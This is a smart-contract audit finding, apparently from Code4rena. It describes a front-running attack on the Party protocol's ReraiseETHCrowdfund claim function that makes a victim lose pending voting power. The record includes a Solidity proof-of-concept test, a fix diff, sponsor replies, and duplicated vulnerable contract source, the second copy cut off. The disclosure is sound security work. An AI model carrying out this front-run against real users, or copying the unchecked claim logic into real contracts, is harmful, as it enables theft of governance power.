{
  "Title": "[H-05] `ReraiseETHCrowdfund.sol`: party card transfer can be front-run by claiming pending voting power which results in a loss of the voting power",
  "Content": "\nIn this report I show how an attacker can abuse the fact that anyone can call [`ReraiseETHCrowdfund.claim`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303) for any user and add voting power to an existing party card.\n\nThe result can be a griefing attack whereby the victim loses voting power. In some cases the attacker can take advantage himself.\n\nIn short this is what needs to happen:\n\n1.  The victim sends a transaction to transfer one of his party cards\n2.  The transaction is front-run and pending voting power of the victim from the `ReraiseETHCrowdfund` contract is claimed to this party card that is transferred\n3.  The victim thereby loses the pending voting power\n\nThe fact that any user is at risk that has pending voting power and transfers a party card and that voting power is arguably the most important asset in the protocol makes me estimate this to be \"High\" severity.\n\n### Proof of Concept\n\nWe start by observing that when the `ReraiseETHCrowdfund` is won, any user can call `ReraiseETHCrowdfund.claim` for any other user and either mint a new party card to him or add the pending voting power to an existing party card:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303)\n\n```solidity\n/// @notice Claim a party card for a contributor if the crowdfund won. Can be called\n///         to claim for self or on another's behalf.\n/// @param tokenId The ID of the party card to add voting power to. If 0, a\n///                new card will be minted.\n/// @param contributor The contributor to claim for.\nfunction claim(uint256 tokenId, address contributor) public {\n    // Check crowdfund lifecycle.\n    {\n        CrowdfundLifecycle lc = getCrowdfundLifecycle();\n        if (lc != CrowdfundLifecycle.Finalized) {\n            revert WrongLifecycleError(lc);\n        }\n    }\n\n\n    uint96 votingPower = pendingVotingPower[contributor];\n\n\n    if (votingPower == 0) return;\n\n\n    {\n        uint96 contribution = (votingPower * 1e4) / exchangeRateBps;\n        uint96 maxContribution_ = maxContribution;\n        // Check that the contribution equivalent of total pending voting\n        // power is not above the max contribution range. This can happen\n        // for contributors who contributed multiple times In this case, the\n        // `claimMultiple` function should be called instead. This is done\n        // so parties may use the minimum and maximum contribution values to\n        // limit the voting power of each card (e.g.  a party desiring a \"1\n        // card = 1 vote\"-like governance system where each card has equal\n        // voting power).\n        if (contribution > maxContribution_) {\n            revert AboveMaximumContributionsError(contribution, maxContribution_);\n        }\n    }\n\n\n    // Burn the crowdfund NFT.\n    _burn(contributor);\n\n\n    delete pendingVotingPower[contributor];\n\n\n    if (tokenId == 0) {\n        // Mint contributor a new party card.\n        tokenId = party.mint(contributor, votingPower, delegationsByContributor[contributor]);\n    } else if (disableContributingForExistingCard) {\n        revert ContributingForExistingCardDisabledError();\n    } else if (party.ownerOf(tokenId) == contributor) {\n        // Increase voting power of contributor's existing party card.\n        party.addVotingPower(tokenId, votingPower);\n    } else {\n        revert NotOwnerError();\n    }\n\n\n    emit Claimed(contributor, tokenId, votingPower);\n}\n```\n\nNote that the caller can specify any `contributor` and can add the pending votes to an existing party card if `!disableContributingForExistingCard && party.ownerOf(tokenId) == contributor`.\n\nSo if User A has pending voting power and transfers one of his party cards to User B, then User C might front-run this transfer and claim the pending voting power to the party card that is transferred.\n\nIf User B performs this attack it is not a griefing attack since User B benefits from it.\n\nNote that at the time of sending the transfer transaction the `ReraiseETHCrowdfund` does not have to be won already. The transaction that does the front-running might contribute to the crowdfund such that it is won and then claim the pending voting power.\n\nAdd the following test to the `ReraiseETHCrowdfund.t.sol` test file. It shows how an attacker would perform such an attack:\n\n```solidity\nfunction test_FrontRunTransfer() public {\n    ReraiseETHCrowdfund crowdfund = _createCrowdfund({\n        initialContribution: 0,\n        initialContributor: payable(address(0)),\n        initialDelegate: address(0),\n        minContributions: 0,\n        maxContributions: type(uint96).max,\n        disableContributingForExistingCard: false,\n        minTotalContributions: 2 ether,\n        maxTotalContributions: 3 ether,\n        duration: 7 days,\n        fundingSplitBps: 0,\n        fundingSplitRecipient: payable(address(0))\n    });\n\n    address attacker = _randomAddress();\n    address victim = _randomAddress();\n    vm.deal(victim, 2.5 ether);\n    vm.deal(attacker, 0.5 ether);\n\n    // @audit-info the victim owns a party card\n    vm.prank(address(party));\n    party.addAuthority(address(this));\n    party.increaseTotalVotingPower(1 ether);\n    uint256 victimTokenId = party.mint(victim, 1 ether, address(0));\n\n\n    vm.startPrank(victim);\n    crowdfund.contribute{ value: 2.5 ether }(victim, \"\");\n    vm.stopPrank();\n\n    /* @audit-info\n    The victim wants to transfer the party card, say to the attacker, and the attacker\n    front-runs this by completing the crowdfund and claiming the victim's pending voting\n    power to the existing party card\n    */\n\n    vm.startPrank(attacker);\n    crowdfund.contribute{ value: 0.5 ether }(attacker, \"\");\n    crowdfund.claim(victimTokenId,victim);\n    vm.stopPrank();\n\n    /* @audit-info\n    when the victim's transfer is executed, he transfers also all of the voting power\n    that was previously his pending voting power (effectively losing it)\n    */\n    vm.prank(victim);\n    party.tranferFrom(victim,attacker,victimTokenId);\n}\n```\n\nSo when there is an ongoing crowdfund it is never safe to transfer one's party card. It can always result in a complete loss of the pending voting power.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nIn the `ReraiseETHCrowdfund.claim` function it should not be possible to add the pending voting power to an existing party card. It is possible though to allow it for the `contributor` himself but not for any user.\n\n```diff\ndiff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol\nindex 580623d..cb560e1 100644\n--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol\n+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol\n@@ -292,7 +292,7 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {\n             tokenId = party.mint(contributor, votingPower, delegationsByContributor[contributor]);\n         } else if (disableContributingForExistingCard) {\n             revert ContributingForExistingCardDisabledError();\n-        } else if (party.ownerOf(tokenId) == contributor) {\n+        } else if (party.ownerOf(tokenId) == contributor && contributor == msg.sender) {\n             // Increase voting power of contributor's existing party card.\n             party.addVotingPower(tokenId, votingPower);\n         } else {\n```\n\n**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-04-party-findings/issues/12#issuecomment-1515465156):**\n > Good finding, still thinking about the mitigation.\n> \n> Slightly hesitant to make the only action when claiming for someone else to be minting them a new card although minting to their existing card might be a rare action because of the friction involved in having to get the ID of one of the person's cards first. Someone minting for someone else might just find it more convenient to mint them a new card, so having that be the only action might not be much of a loss.\n\n**[0xble (Party) commented](https://github.com/code-423n4/2023-04-party-findings/issues/12#issuecomment-1532054697):**\n > We've decided to refactor the way claiming works in the `ReraiseETHCrowdfund`, partially because a large number of findings like this being submitted around that one area that highlighted for us the need to rework its logic.\n> \n> The change will make it so (1) crowdfund NFTs are minted per contribution instead of per address and (2) claiming works more like a 1:1 conversion of your crowdfund NFT into a party card instead of how it works now. In the future we will also add the ability to split/merge party cards.\n> \n> This should mitigate this finding because in this new system you cannot decide to add the voting power from a crowdfund NFT to an existing party card when claiming, only mint a new party card.\n\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-04-party",
  "Code": [
    {
      "filename": "contracts/crowdfund/ReraiseETHCrowdfund.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.17;\n\nimport \"./ETHCrowdfundBase.sol\";\nimport \"../crowdfund/CrowdfundNFT.sol\";\nimport \"../utils/LibAddress.sol\";\nimport \"../utils/LibRawResult.sol\";\nimport \"../utils/LibSafeCast.sol\";\nimport \"../tokens/ERC721Receiver.sol\";\nimport \"../party/Party.sol\";\nimport \"../globals/IGlobals.sol\";\nimport \"../gatekeepers/IGateKeeper.sol\";\n\n/// @notice A crowdfund for raising additional funds for an existing parties.\ncontract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {\n    using LibRawResult for bytes;\n    using LibSafeCast for uint256;\n    using LibAddress for address payable;\n\n    struct BatchContributeArgs {\n        // The address to which voting power will be delegated for all contributions.\n        address delegate;\n        // The contribution amounts in wei. The length of this array must be\n        // equal to the length of `tokenIds`.\n        uint96[] values;\n        // The data required to be validated by the `gatekeeper`, if set. If no\n        // `gatekeeper` is set, this can be empty.\n        bytes[] gateDatas;\n    }\n\n    struct BatchContributeForArgs {\n        // Addresses of to credit the contributions under. Each contribution\n        // amount in `values` corresponds to a recipient in this array.\n        address payable[] recipients;\n        // The delegate to set for each recipient if they have not delegated\n        // before.\n        address[] initialDelegates;\n        // The contribution amounts in wei. The length of this array must be\n        // equal to the length of `recipients`.\n        uint96[] values;\n        // The data required to be validated by the `gatekeeper`, if set. If no\n        // `gatekeeper` is set, this can be empty.\n        bytes[] gateDatas;\n        // Whether to revert if any individual contribution fails or continue.\n        bool revertOnFailure;\n    }\n\n    event Claimed(address indexed contributor, uint256 indexed tokenId, uint256 votingPower);\n    event Refunded(address indexed contributor, uint256 amount);\n\n    error RemainingVotingPowerAfterClaimError(uint256 remainingVotingPower);\n\n    // The `Globals` contract storing global configuration values. This contract\n    // is immutable and it’s address will never change.\n    IGlobals private immutable _GLOBALS;\n\n    /// @notice The amount of voting power that will be received by a\n    ///         contributor after the crowdfund is won.\n    mapping(address => uint96) public pendingVotingPower;\n\n    // Set the `Globals` contract.\n    constructor(IGlobals globals) CrowdfundNFT(globals) {\n        _GLOBALS = globals;\n    }\n\n    /// @notice Initializer to be delegatecalled by `Proxy` constructor. Will\n    ///         revert if called outside the constructor.\n    /// @param opts The options to initialize the crowdfund with.\n    function initialize(ETHCrowdfundOptions memory opts) external payable onlyConstructor {\n        // Initialize the crowdfund.\n        ETHCrowdfundBase._initialize(opts);\n\n        // Initialize the crowdfund NFT.\n        _initialize(\n            opts.party.name(),\n            opts.party.symbol(),\n            0 // Ignored. Will use customization preset from party.\n        );\n\n        // If the deployer passed in some ETH during deployment, credit them\n        // for the initial contribution.\n        uint96 initialContribution = msg.value.safeCastUint256ToUint96();\n        if (initialContribution > 0) {\n            // If this contract has ETH, either passed in during deployment or\n            // pre-existing, credit it to the `initialContributor`.\n            _contribute(opts.initialContributor, opts.initialDelegate, initialContribution, \"\");\n        }\n\n        // Set up gatekeeper after initial contribution (initial always gets in).\n        gateKeeper = opts.gateKeeper;\n        gateKeeperId = opts.gateKeeperId;\n    }\n\n    // Initialize name and symbol for crowdfund NFT.\n    function _initialize(string memory name_, string memory symbol_, uint256) internal override {\n        name = name_;\n        symbol = symbol_;\n\n        RendererStorage rendererStorage = RendererStorage(\n            _GLOBALS.getAddress(LibGlobals.GLOBAL_RENDERER_STORAGE)\n        );\n\n        // Use the same customization preset as the party.\n        uint256 customizationPresetId = rendererStorage.getPresetFor(address(party));\n        if (customizationPresetId != 0) {\n            rendererStorage.useCustomizationPreset(customizationPresetId);\n        }\n    }\n\n    /// @notice Contribute ETH to this crowdfund on behalf of a contributor.\n    /// @param delegate The address to which voting power will be delegated to\n    ///                 during the governance phase.\n    /// @param gateData Data to pass to the gatekeeper to prove eligibility.\n    /// @return votingPower The voting power the contributor receives for their\n    ///                     contribution.\n    function contribute(\n        address delegate,\n        bytes memory gateData\n    ) public payable onlyDelegateCall returns (uint96 votingPower) {\n        return\n            _contribute(\n                payable(msg.sender),\n                delegate,\n                msg.value.safeCastUint256ToUint96(),\n                gateData\n            );\n    }\n\n    /// @notice `contribute()` in batch form.\n    ///         May not revert if any individual contribution fails.\n    /// @param args The arguments to pass to each `contribute()` call.\n    /// @return votingPowers The voting power received for each contribution.\n    function batchContribute(\n        BatchContributeArgs calldata args\n    ) external payable onlyDelegateCall returns (uint96[] memory votingPowers) {\n        uint256 numContributions = args.values.length;\n        votingPowers = new uint96[](numContributions);\n\n        uint256 ethAvailable = msg.value;\n        for (uint256 i; i < numContributions; ++i) {\n            ethAvailable -= args.values[i];\n\n            votingPowers[i] = _contribute(\n                payable(msg.sender),\n                args.delegate,\n                args.values[i],\n                args.gateDatas[i]\n            );\n        }\n\n        // Refund any unused ETH.\n        if (ethAvailable > 0) payable(msg.sender).transfer(ethAvailable);\n    }\n\n    /// @notice Contribute to this crowdfund on behalf of another address.\n    /// @param recipient The address to record the contribution under\n    /// @param initialDelegate The address to delegate to for the governance\n    ///                        phase if recipient hasn't delegated\n    /// @param gateData Data to pass to the gatekeeper to prove eligibility\n    /// @return votingPower The voting power received for the contribution\n    function contributeFor(\n        address payable recipient,\n        address initialDelegate,\n        bytes memory gateData\n    ) external payable onlyDelegateCall returns (uint96 votingPower) {\n        return\n            _contribute(recipient, initialDelegate, msg.value.safeCastUint256ToUint96(), gateData);\n    }\n\n    /// @notice `contributeFor()` in batch form.\n    ///         May not revert if any individual contribution fails.\n    /// @param args The arguments for the batched `contributeFor()` calls.\n    /// @return votingPowers The voting power received for each contribution.\n    function batchContributeFor(\n        BatchContributeForArgs memory args\n    ) external payable onlyDelegateCall returns (uint96[] memory votingPowers) {\n        uint256 numContributions = args.recipients.length;\n        votingPowers = new uint96[](numContributions);\n\n        uint256 ethAvailable = msg.value;\n        for (uint256 i; i < numContributions; ++i) {\n            ethAvailable -= args.values[i];\n\n            (bool s, bytes memory r) = address(this).call{ value: args.values[i] }(\n                abi.encodeCall(\n                    this.contributeFor,\n                    (args.recipients[i], args.initialDelegates[i], args.gateDatas[i])\n                )\n            );\n\n            if (!s) {\n                if (args.revertOnFailure) {\n                    r.rawRevert();\n                }\n            } else {\n                votingPowers[i] = abi.decode(r, (uint96));\n            }\n        }\n\n        // Refund any unused ETH.\n        if (ethAvailable > 0) payable(msg.sender).transfer(ethAvailable);\n    }\n\n    function _contribute(\n        address payable contributor,\n        address delegate,\n        uint96 amount,\n        bytes memory gateData\n    ) private returns (uint96 votingPower) {\n        // Require a non-null delegate.\n        if (delegate == address(0)) {\n            revert InvalidDelegateError();\n        }\n\n        // Must not be blocked by gatekeeper.\n        IGateKeeper _gateKeeper = gateKeeper;\n        if (_gateKeeper != IGateKeeper(address(0))) {\n            if (!_gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) {\n                revert NotAllowedByGateKeeperError(\n                    contributor,\n                    _gateKeeper,\n                    gateKeeperId,\n                    gateData\n                );\n            }\n        }\n\n        votingPower = _processContribution(contributor, delegate, amount);\n\n        // OK to contribute with zero just to update delegate.\n        if (amount == 0) return 0;\n\n        uint256 previousVotingPower = pendingVotingPower[contributor];\n\n        pendingVotingPower[contributor] += votingPower;\n\n        // Mint a crowdfund NFT if this is their first contribution.\n        if (previousVotingPower == 0) _mint(contributor);\n    }\n\n    /// @notice Claim a party card for a contributor if the crowdfund won. Can be called\n    ///         to claim for self or on another's behalf.\n    /// @param contributor The contributor to claim for.\n    function claim(address contributor) external {\n        claim(\n            0, // Mint a new party card.\n            contributor\n        );\n    }\n\n    /// @notice Claim a party card for a contributor if the crowdfund won. Can be called\n    ///         to claim for self or on another's behalf.\n    /// @param tokenId The ID of the party card to add voting power to. If 0, a\n    ///                new card will be minted.\n    /// @param contributor The contributor to claim for.\n    function claim(uint256 tokenId, address contributor) public {\n        // Check crowdfund lifecycle.\n        {\n            CrowdfundLifecycle lc = getCrowdfundLifecycle();\n            if (lc != CrowdfundLifecycle.Finalized) {\n                revert WrongLifecycleError(lc);\n            }\n        }\n\n        uint96 votingPower = pendingVotingPower[contributor];\n\n        if (votingPower == 0) return;\n\n        {\n            uint96 contribution = (votingPower * 1e4) / exchangeRateBps;\n            uint96 maxContribution_ = maxContribution;\n            // Check that the contribution equivalent of total pending voting\n            // power is not above the max contribution range. This can happen\n            // for contributors who contributed multiple times In this case, the\n            // `claimMultiple` function should be called instead. This is done\n            // so parties may use the minimum and maximum contribution values to\n            // limit the voting power of each card (e.g.  a party desiring a \"1\n            // card = 1 vote\"-like governance system where each card has equal\n            // voting power).\n            if (contribution > maxContribution_) {\n                revert AboveMaximumContributionsError(contribution, maxContribution_);\n            }\n        }\n\n        // Burn the crowdfund NFT.\n        _burn(contributor);\n\n        delete pendingVotingPower[contributor];\n\n        if (tokenId == 0) {\n            // Mint contributor a new party card.\n            tokenId = party.mint(contributor, votingPower, delegationsByContributor[contributor]);\n        } else if (disableContributingForExistingCard) {\n            revert ContributingForExistingCardDisabledError();\n        } else if (party.ownerOf(tokenId) == contributor) {\n            // Increase voting power of contributor's existing party card.\n            party.addVotingPower(tokenId, votingPower);\n        } else {\n            revert NotOwnerError();\n        }\n\n        emit Claimed(contributor, tokenId, votingPower);\n    }\n\n    /// @notice `claim()` in batch form.\n    ///         May not revert if any individual refund fails.\n    /// @param tokenIds The IDs of the party cards to add voting power to. If 0, a\n    ///                 new card will be minted.\n    /// @param contributors The contributors to claim for.\n    /// @param revertOnFailure If true, reverts if any individual claim fails.\n    function batchClaim(\n        uint256[] calldata tokenIds,\n        address[] calldata contributors,\n        bool revertOnFailure\n    ) external {\n        for (uint256 i; i < contributors.length; ++i) {\n            (bool s, bytes memory r) = address(this).call(\n                // Using `abi.encodeWithSignature()` instead of `abi.encodeCall()`\n                // because `abi.encodeCall()` doesn't support overloaded functions.\n                abi.encodeWithSignature(\"claim(uint256,address)\", tokenIds[i], contributors[i])\n            );\n            if (revertOnFailure && !s) {\n                r.rawRevert();\n            }\n        }\n    }\n\n    /// @notice Claim multiple party cards for a contributor if the crowdfund won. Can be called\n    ///         to claim for self or on another's behalf.\n    /// @param votingPowerByCard The voting power for each card claimed. Must add up to the\n    ///                          total pending voting power for the contributor.\n    /// @param contributor The contributor to claim for.\n    function claimMultiple(uint96[] memory votingPowerByCard, address contributor) external {\n        // Check crowdfund lifecycle.\n        {\n            CrowdfundLifecycle lc = getCrowdfundLifecycle();\n            if (lc != CrowdfundLifecycle.Finalized) {\n                revert WrongLifecycleError(lc);\n            }\n        }\n\n        uint256 votingPower = pendingVotingPower[contributor];\n\n        if (votingPower == 0) return;\n\n        // Burn the crowdfund NFT.\n        _burn(contributor);\n\n        delete pendingVotingPower[contributor];\n\n        address delegate = delegationsByContributor[contributor];\n        uint96 minContribution_ = minContribution;\n        uint96 maxContribution_ = maxContribution;\n        for (uint256 i; i < votingPowerByCard.length; ++i) {\n            if (votingPowerByCard[i] == 0) continue;\n\n            // Check that the contribution equivalent of voting power is within\n            // contribution range. This is done so parties may use the minimum\n            // and maximum contribution values to limit the voting power of each\n            // card (e.g. a party desiring a \"1 card = 1 vote\"-like governance\n            // system where each card has equal voting power).\n            uint96 contribution = (votingPowerByCard[i] * 1e4) / exchangeRateBps;\n            if (contribution < minContribution_) {\n                revert BelowMinimumContributionsError(contribution, minContribution_);\n            }\n\n            if (contribution > maxContribution_) {\n                revert AboveMaximumContributionsError(contribution, maxContribution_);\n            }\n\n            votingPower -= votingPowerByCard[i];\n\n            // Mint contributor a new party card.\n            uint256 tokenId = party.mint(contributor, votingPowerByCard[i], delegate);\n\n            emit Claimed(contributor, tokenId, votingPowerByCard[i]);\n        }\n\n        // Requires that all voting power is claimed because the contributor is\n        // expected to have burned their crowdfund NFT.\n        if (votingPower != 0) revert RemainingVotingPowerAfterClaimError(votingPower);\n    }\n\n    /// @notice `claimMultiple()` in batch form.\n    ///         May not revert if any individual refund fails.\n    /// @param votingPowerByCards The voting power for each card claimed for each\n    ///                           contributor. Must add up to the total pending\n    ///                           voting power for the contributor.\n    /// @param contributors The contributors to claim for.\n    /// @param revertOnFailure If true, reverts if any individual claim fails.\n    function batchClaimMultiple(\n        uint96[][] calldata votingPowerByCards,\n        address[] calldata contributors,\n        bool revertOnFailure\n    ) external {\n        for (uint256 i; i < contributors.length; ++i) {\n            (bool s, bytes memory r) = address(this).call(\n                abi.encodeCall(this.claimMultiple, (votingPowerByCards[i], contributors[i]))\n            );\n            if (revertOnFailure && !s) {\n                r.rawRevert();\n            }\n        }\n    }\n\n    /// @notice Refund the owner of a party card and burn it. Only available if\n    ///         the crowdfund lost. Can be called to refund for self or on\n    ///         another's behalf.\n    /// @param contributor The contributor to refund.\n    function refund(address payable contributor) external returns (uint96 amount) {\n        // Check crowdfund lifecycle.\n        {\n            CrowdfundLifecycle lc = getCrowdfundLifecycle();\n            if (lc != CrowdfundLifecycle.Lost) {\n                revert WrongLifecycleError(lc);\n            }\n        }\n\n        // Get amount to refund.\n        uint96 votingPower = pendingVotingPower[contributor];\n        amount = _calculateRefundAmount(votingPower);\n\n        if (amount == 0) return 0;\n\n        // Burn the crowdfund NFT.\n        _burn(contributor);\n\n        delete pendingVotingPower[contributor];\n\n        // Refund contributor.\n        contributor.transferEth(amount);\n\n        emit Refunded(contributor, amount);\n    }\n\n    /// @notice `refund()` in batch form.\n    ///         May not revert if any individual refund fails.\n    /// @param contributors The contributors to refund.\n    /// @param revertOnFailure If true, revert if any refund fails.\n    /// @return amounts The amounts of ETH refunded for each refund.\n    function batchRefund(\n        address payable[] calldata contributors,\n        bool revertOnFailure\n    ) external returns (uint96[] memory amounts) {\n        uint256 numRefunds = contributors.length;\n        amounts = new uint96[](numRefunds);\n\n        for (uint256 i; i < numRefunds; ++i) {\n            (bool s, bytes memory r) = address(this).call(\n                abi.encodeCall(this.refund, (contributors[i]))\n            );\n\n            if (!s) {\n                if (revertOnFailure) {\n                    r.rawRevert();\n                }\n            } else {\n                amounts[i] = abi.decode(r, (uint96));\n            }\n        }\n    }\n}"
    },
    {
      "filename": "contracts/crowdfund/ReraiseETHCrowdfund.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.17;\n\nimport \"./ETHCrowdfundBase.sol\";\nimport \"../crowdfund/CrowdfundNFT.sol\";\nimport \"../utils/LibAddress.sol\";\nimport \"../utils/LibRawResult.sol\";\nimport \"../utils/LibSafeCast.sol\";\nimport \"../tokens/ERC721Receiver.sol\";\nimport \"../party/Party.sol\";\nimport \"../globals/IGlobals.sol\";\nimport \"../gatekeepers/IGateKeeper.sol\";\n\n/// @notice A crowdfund for raising additional funds for an existing parties.\ncontract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {\n    using LibRawResult for bytes;\n    using LibSafeCast for uint256;\n    using LibAddress for address payable;\n\n    struct BatchContributeArgs {\n        // The address to which voting power will be delegated for all contributions.\n        address delegate;\n        // The contribution amounts in wei. The length of this array must be\n        // equal to the length of `tokenIds`.\n        uint96[] values;\n        // The data required to be validated by the `gatekeeper`, if set. If no\n        // `gatekeeper` is set, this can be empty.\n        bytes[] gateDatas;\n    }\n\n    struct BatchContributeForArgs {\n        // Addresses of to credit the contributions under. Each contribution\n        // amount in `values` corresponds to a recipient in this array.\n        address payable[] recipients;\n        // The delegate to set for each recipient if they have not delegated\n        // before.\n        address[] initialDelegates;\n        // The contribution amounts in wei. The length of this array must be\n        // equal to the length of `recipients`.\n        uint96[] values;\n        // The data required to be validated by the `gatekeeper`, if set. If no\n        // `gatekeeper` is set, this can be empty.\n        bytes[] gateDatas;\n        // Whether to revert if any individual contribution fails or continue.\n        bool revertOnFailure;\n    }\n\n    event Claimed(address indexed contributor, uint256 indexed tokenId, uint256 votingPower);\n    event Refunded(address indexed contributor, uint256 amount);\n\n    error RemainingVotingPowerAfterClaimError(uint256 remainingVotingPower);\n\n    // The `Globals` contract storing global configuration values. This contract\n    // is immutable and it’s address will never change.\n    IGlobals private immutable _GLOBALS;\n\n    /// @notice The amount of voting power that will be received by a\n    ///         contributor after the crowdfund is won.\n    mapping(address => uint96) public pendingVotingPower;\n\n    // Set the `Globals` contract.\n    constructor(IGlobals globals) CrowdfundNFT(globals) {\n        _GLOBALS = globals;\n    }\n\n    /// @notice Initializer to be delegatecalled by `Proxy` constructor. Will\n    ///         revert if called outside the constructor.\n    /// @param opts The options to initialize the crowdfund with.\n    function initialize(ETHCrowdfundOptions memory opts) external payable onlyConstructor {\n        // Initialize the crowdfund.\n        ETHCrowdfundBase._initialize(opts);\n\n        // Initialize the crowdfund NFT.\n        _initialize(\n            opts.party.name(),\n            opts.party.symbol(),\n            0 // Ignored. Will use customization preset from party.\n        );\n\n        // If the deployer passed in some ETH during deployment, credit them\n        // for the initial contribution.\n        uint96 initialContribution = msg.value.safeCastUint256ToUint96();\n        if (initialContribution > 0) {\n            // If this contract has ETH, either passed in during deployment or\n            // pre-existing, credit it to the `initialContributor`.\n            _contribute(opts.initialContributor, opts.initialDelegate, initialContribution, \"\");\n        }\n\n        // Set up gatekeeper after initial contribution (initial always gets in).\n        gateKeeper = opts.gateKeeper;\n        gateKeeperId = opts.gateKeeperId;\n    }\n\n    // Initialize name and symbol for crowdfund NFT.\n    function _initialize(string memory name_, string memory symbol_, uint256) internal override {\n        name = name_;\n        symbol = symbol_;\n\n        RendererStorage rendererStorage = RendererStorage(\n            _GLOBALS.getAddress(LibGlobals.GLOBAL_RENDERER_STORAGE)\n        );\n\n        // Use the same customization preset as the party.\n        uint256 customizationPresetId = rendererStorage.getPresetFor(address(party));\n        if (customizationPresetId != 0) {\n            rendererStorage.useCustomizationPreset(customizationPresetId);\n        }\n    }\n\n    /// @notice Contribute ETH to this crowdfund on behalf of a contributor.\n    /// @param delegate The address to which voting power will be delegated to\n    ///                 during the governance phase.\n    /// @param gateData Data to pass to the gatekeeper to prove eligibility.\n    /// @return votingPower The voting power the contributor receives for their\n    ///                     contribution.\n    function contribute(\n        address delegate,\n        bytes memory gateData\n    ) public payable onlyDelegateCall returns (uint96 votingPower) {\n        return\n            _contribute(\n                payable(msg.sender),\n                delegate,\n                msg.value.safeCastUint256ToUint96(),\n                gateData\n            );\n    }\n\n    /// @notice `contribute()` in batch form.\n    ///         May not revert if any individual contribution fails.\n    /// @param args The arguments to pass to each `contribute()` call.\n    /// @return votingPowers The voting power received for each contribution.\n    function batchContribute(\n        BatchContributeArgs calldata args\n    ) external payable onlyDelegateCall returns (uint96[] memory votingPowers) {\n        uint256 numContributions = args.values.length;\n        votingPowers = new uint96[](numContributions);\n\n        uint256 ethAvailable = msg.value;\n        for (uint256 i; i < numContributions; ++i) {\n            ethAvailable -= args.values[i];\n\n            votingPowers[i] = _contribute(\n                payable(msg.sender),\n                args.delegate,\n                args.values[i],\n                args.gateDatas[i]\n            );\n        }\n\n        // Refund any unused ETH.\n        if (ethAvailable > 0) payable(msg.sender).transfer(ethAvailable);\n    }\n\n    /// @notice Contribute to this crowdfund on behalf of another address.\n    /// @param recipient The address to record the contribution under\n    /// @param initialDelegate The address to delegate to for the governance\n    ///                        phase if recipient hasn't delegated\n    /// @param gateData Data to pass to the gatekeeper to prove eligibility\n    /// @return votingPower The voting power received for the contribution\n    function contributeFor(\n        address payable recipient,\n        address initialDelegate,\n        bytes memory gateData\n    ) external payable onlyDelegateCall returns (uint96 votingPower) {\n        return\n            _contribute(recipient, initialDelegate, msg.value.safeCastUint256ToUint96(), gateData);\n    }\n\n    /// @notice `contributeFor()` in batch form.\n    ///         May not revert if any individual contribution fails.\n    /// @param args The arguments for the batched `contributeFor()` calls.\n    /// @return votingPowers The voting power received for each contribution.\n    function batchContributeFor(\n        BatchContributeForArgs memory args\n    ) external payable onlyDelegateCall returns (uint96[] memory votingPowers) {\n        uint256 numContributions = args.recipients.length;\n        votingPowers = new uint96[](numContributions);\n\n        uint256 ethAvailable = msg.value;\n        for (uint256 i; i < numContributions; ++i) {\n            ethAvailable -= args.values[i];\n\n            (bool s, bytes memory r) = address(this).call{ value: args.values[i] }(\n                abi.encodeCall(\n                    this.contributeFor,\n                    (args.recipients[i], args.initialDelegates[i], args.gateDatas[i])\n                )\n            );\n\n            if (!s) {\n                if (args.revertOnFailure) {\n                    r.rawRevert();\n                }\n            } else {\n                votingPowers[i] = abi.decode(r, (uint96));\n            }\n        }\n\n        // Refund any unused ETH.\n        if (ethAvailable > 0) payable(msg.sender).transfer(ethAvailable);\n    }\n\n    function _contribute(\n        address payable contributor,\n        address delegate,\n        uint96 amount,\n        bytes memory gateData\n    ) private returns (uint96 votingPower) {\n        // Require a non-null delegate.\n        if (delegate == address(0)) {\n            revert InvalidDelegateError();\n        }\n\n        // Must not be blocked by gatekeeper.\n        IGateKeeper _gateKeeper = gateKeeper;\n        if (_gateKeeper != IGateKeeper(address(0))) {\n            if (!_gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) {\n                revert NotAllowedByGateKeeperError(\n                    contributor,\n                    _gateKeeper,\n                    gateKeeperId,\n                    gateData\n                );\n            }\n        }\n\n        votingPower = _processContribution(contributor, delegate, amount);\n\n        // OK to contribute with zero just to update delegate.\n        if (amount == 0) return 0;\n\n        uint256 previousVotingPower = pendingVotingPower[contributor];\n\n        pendingVotingPower[contributor] += votingPower;\n\n        // Mint a crowdfund NFT if this is their first contribution.\n        if (previousVotingPower == 0) _mint(contributor);\n    }\n\n    /// @notice Claim a party card for a contributor if the crowdfund won. Can be called\n    ///         to claim for self or on another's behalf.\n    /// @param contributor The contributor to claim for.\n    function claim(address contributor) external {\n        claim(\n            0, // Mint a new party card.\n            contributor\n        );\n    }\n\n    /// @notice Claim a party card for a contributor if the crowdfund won. Can be called\n    ///         to claim for self or on another's behalf.\n    /// @param tokenId The ID of the party card to add voting power to. If 0, a\n    ///                new card will be minted.\n    /// @param contributor The contributor to claim for.\n    function claim(uint256 tokenId, address contributor) public {\n        // Check crowdfund lifecycle.\n        {\n            CrowdfundLifecycle lc = getCrowdfundLifecycle();\n            if (lc != CrowdfundLifecycle.Finalized) {\n                revert WrongLifecycleError(lc);\n            }\n        }\n\n        uint96 votingPower = pendingVotingPower[contributor];\n\n        if (votingPower == 0) return;\n\n        {\n            uint96 contribution = (votingPower * 1e4) / exchangeRateBps;\n            uint96 maxContribution_ = maxContribution;\n            // Check that the contribution equivalent of total pending voting\n            // power is not above the max contribution range. This can happen\n            // for contributors who contributed multiple times In this case, the\n            // `claimMultiple` function should be called instead. This is done\n            // so parties may use the minimum and maximum contribution values to\n            // limit the voting power of each card (e.g.  a party desiring a \"1\n            // card = 1 vote\"-like governance 